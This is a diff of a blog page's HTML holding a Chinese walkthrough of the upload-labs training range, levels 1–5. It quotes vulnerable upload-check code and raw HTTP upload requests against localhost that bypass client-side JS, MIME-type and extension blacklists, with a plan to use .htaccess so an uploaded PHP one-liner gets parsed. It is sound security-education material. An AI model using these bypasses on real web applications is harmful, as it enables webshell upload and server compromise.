@@ -19,12 +19,12 @@
   <meta name="author" content="fishcanf1y">
   <meta name="keywords" content="fishcanf1y">
   
-    <meta name="description" content="Introduction：  Repo Address: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs Description：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。">
+    <meta name="description" content="Introduction： Repo Address: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs Description：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="upload-labs靶场小计">
 <meta property="og:url" content="https://fishcanf1y.github.io/2025/06/17/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/index.html">
 <meta property="og:site_name" content="fishcanf1y">
-<meta property="og:description" content="Introduction：  Repo Address: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs Description：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。">
+<meta property="og:description" content="Introduction： Repo Address: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs Description：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-06-17T14:11:09.000Z">
 <meta property="article:modified_time" content="2025-06-27T12:29:51.372Z">
@@ -298,16 +298,12 @@
             
               <div class="markdown-body">
                 
-                <h1>Introduction：</h1>
-<ul>
+                <h1 id="Introduction："><a href="#Introduction：" class="headerlink" title="Introduction："></a>Introduction：</h1><ul>
 <li><strong>Repo Address</strong>: <a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></li>
 <li><strong>Description</strong>：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</li>
 </ul>
 <span id="more"></span>
-<h1>正文开始</h1>
-<h2 id="Pass-01">Pass-01</h2>
-<p><strong>源码分析</strong>:</p>
-<div class="code-wrapper"><pre><code class="hljs Javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;
+<h1 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><strong>源码分析</strong>:<br><div class="code-wrapper"><pre><code class="hljs Javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;
     <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;
     <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;
         <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);
@@ -324,11 +320,8 @@
         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
     &#125;
 &#125;
-</code></pre></div>
-<p>在源码中我们可以看到其在客户端使用了js对不合法图片进行了检查，因此只需要在Firefox浏览器中禁用js即可绕过</p>
-<h2 id="Pass-02">Pass-02</h2>
-<p><strong>源码分析</strong>:</p>
-<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+</code></pre></div><br>在源码中我们可以看到其在客户端使用了js对不合法图片进行了检查，因此只需要在Firefox浏览器中禁用js即可绕过</p>
+<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>源码分析</strong>:<br><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
@@ -347,9 +340,7 @@
         <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
     &#125;
 &#125;
-</code></pre></div>
-<p>在源码的<code>type</code>一处我们得知其对文件的类型做了限制，我们可以用BurpSuite或Yakit把数据包拉下来，然后将文件类型修改为对应的类型即可绕过</p>
-<div class="code-wrapper"><pre><code class="hljs bash">payload:
+</code></pre></div><br>在源码的<code>type</code>一处我们得知其对文件的类型做了限制，我们可以用BurpSuite或Yakit把数据包拉下来，然后将文件类型修改为对应的类型即可绕过<br><div class="code-wrapper"><pre><code class="hljs bash">payload:
 POST /upload-labs/Pass-02/index.php HTTP/1.1
 Host: 127.0.0.1
 Accept-Encoding: gzip, deflate, br, zstd
@@ -379,10 +370,8 @@ Content-Type: image/png
 Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span>
 
 
-------WebKitFormBoundary9OENpdlcocFeQ6oY--</code></pre></div>
-<h2 id="Pass-03">Pass-03</h2>
-<p><strong>源码分析：</strong></p>
-<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+------WebKitFormBoundary9OENpdlcocFeQ6oY--</code></pre></div></p>
+<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>源码分析：</strong><br><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
@@ -408,9 +397,7 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
     &#125; <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
     &#125;
-&#125;</code></pre></div>
-<p>观察后发现其仅过滤了<code>asp</code>,<code>aspx</code>,<code>php</code>和<code>jsp</code>这四种后缀名，这里举一个例子<code>php</code>-&gt;<code>phtml</code>以混淆视听</p>
-<div class="code-wrapper"><pre><code class="hljs bash">payload:
+&#125;</code></pre></div><br>观察后发现其仅过滤了<code>asp</code>,<code>aspx</code>,<code>php</code>和<code>jsp</code>这四种后缀名，这里举一个例子<code>php</code>-&gt;<code>phtml</code>以混淆视听<br><div class="code-wrapper"><pre><code class="hljs bash">payload:
 POST /upload-labs/Pass-03/index.php HTTP/1.1
 Host: 127.0.0.1
 Upgrade-Insecure-Requests: 1
@@ -440,10 +427,8 @@ Content-Type: application/octet-stream
 Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span>
 
 ------WebKitFormBoundaryAl4mS15DQA2JvZiO--
-</code></pre></div>
-<h2 id="Pass-04">Pass-04</h2>
-<p><strong>源码分析：</strong></p>
-<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+</code></pre></div></p>
+<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>源码分析：</strong><br><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
@@ -469,9 +454,7 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
     &#125; <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
     &#125;
-&#125;</code></pre></div>
-<p>在这里我们可以观察出其过滤了很多后缀名，其次<code>转换大小写</code>使得我们无法通过混淆大小写以绕过，但是其中的<code>去除字符串::$DATA</code>和<code>收尾去空</code>使得我们可以用类似于双后缀的方法绕过，这样它会把后面那个后缀吃掉而只保留前面的后缀，且只验证被吃掉的那个后缀，最终成功解析</p>
-<div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload-labs/Pass-04/index.php</span> <span class="hljs-meta">HTTP/1.1</span>
+&#125;</code></pre></div><br>在这里我们可以观察出其过滤了很多后缀名，其次<code>转换大小写</code>使得我们无法通过混淆大小写以绕过，但是其中的<code>去除字符串::$DATA</code>和<code>收尾去空</code>使得我们可以用类似于双后缀的方法绕过，这样它会把后面那个后缀吃掉而只保留前面的后缀，且只验证被吃掉的那个后缀，最终成功解析<br><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload-labs/Pass-04/index.php</span> <span class="hljs-meta">HTTP/1.1</span>
 <span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1
 <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryVUBAzK6LwIFArjzI
 <span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate
@@ -499,11 +482,8 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
 <span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI</span>
 <span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span>
 <span class="language-php"></span>
-<span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI--</span></code></pre></div>
-<p><strong>在此我们认识到了一个更加有效的对抗文件上传漏洞的方案——以白名单代替黑名单</strong></p>
-<h2 id="Pass-05">Pass-05</h2>
-<p><strong>源码分析：</strong></p>
-<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI--</span></code></pre></div><br><strong>在此我们认识到了一个更加有效的对抗文件上传漏洞的方案——以白名单代替黑名单</strong></p>
+<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><strong>源码分析：</strong><br><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
@@ -530,10 +510,7 @@ Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot
         <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
     &#125;
 &#125;
-</code></pre></div>
-<p>这里我们乍一看跟上面第四关的源码好像是一摸一样的，但是其pass的思路不大相同，再看看提示<br>
-<strong>提示：上传目录存在php文件（readme.php）</strong><br>
-笔者的第一想法可能是设计&quot;文件包含(include)&quot;，有了大致思路我们可以再想想应该如何去include这个存在我们的一句话或者是phpinfo的文件并将其正常解析，以传统的经验来看我们可以尝试着上传<code>.htaccess</code>文件，以下笔者在此阐述什么是<code>.htaccess</code>文件以及为什么要这样去做</p>
+</code></pre></div><br>这里我们乍一看跟上面第四关的源码好像是一摸一样的，但是其pass的思路不大相同，再看看提示<br><strong>提示：上传目录存在php文件（readme.php）</strong><br>笔者的第一想法可能是设计”文件包含(include)”，有了大致思路我们可以再想想应该如何去include这个存在我们的一句话或者是phpinfo的文件并将其正常解析，以传统的经验来看我们可以尝试着上传<code>.htaccess</code>文件，以下笔者在此阐述什么是<code>.htaccess</code>文件以及为什么要这样去做</p>
 
                 
               </div>
